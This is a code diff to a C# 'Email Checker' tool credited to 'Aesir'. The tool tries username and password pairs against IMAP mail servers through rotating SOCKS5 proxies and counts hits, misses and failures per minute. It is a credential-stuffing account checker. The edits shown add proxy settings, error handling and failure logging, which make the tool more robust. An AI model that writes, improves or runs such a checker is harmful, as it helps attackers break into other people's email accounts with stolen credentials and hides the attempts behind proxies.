@@ -105,6 +105,7 @@ namespace EmailChecker
                 string[] split = proxyLine.Split(":");
 
                 imap.SocksHostname = split[0];
+                imap.SocksVersion = 5;
                 imap.SocksPort = int.Parse(split[1]);
 
                 if (split.Length == 4)
@@ -119,15 +120,22 @@ namespace EmailChecker
 
         static async Task<bool?> Check(string username, string password, string target)
         {
-            string[] split = target.Split(":");
-            Imap imap = GetImap();
-            imap.Port = int.Parse(split[1]);
+            try
+            {
+                string[] split = target.Split(":");
+                Imap imap = GetImap();
+                imap.Port = int.Parse(split[1]);
 
-            bool res = imap.Connect(split[0]);
-            if (!res)
+                bool res = imap.Connect(split[0]);
+                if (!res)
+                    return null;
+
+                return imap.Login(username, password);
+            }
+            catch (Exception)
+            {
                 return null;
-
-            return imap.Login(username, password);
+            }
         }
 
         static async Task WorkerThread()
@@ -144,6 +152,7 @@ namespace EmailChecker
                     Interlocked.Increment(ref checks);
                     if (!res.HasValue)
                     {
+                        Console.WriteLine($"[FAIL] {line} - {target}", Color.Red);
                         Interlocked.Increment(ref failed);
                         continue;
                     }
@@ -157,6 +166,7 @@ namespace EmailChecker
                     }
                     else
                     {
+                        Console.WriteLine($"[MISS] {line} - {target}", Color.Red);
                         Interlocked.Increment(ref miss);
                         continue;
                     }
@@ -203,7 +213,7 @@ namespace EmailChecker
                     $"Email Checker | By Aesir | CPM: {checks * 60} | Hits: {hits} | Miss: {miss} | Failed: {failed}";
 
                 checks = 0;
-                await Task.Delay(1000);
+                Thread.Sleep(1000);
             }
 
         }
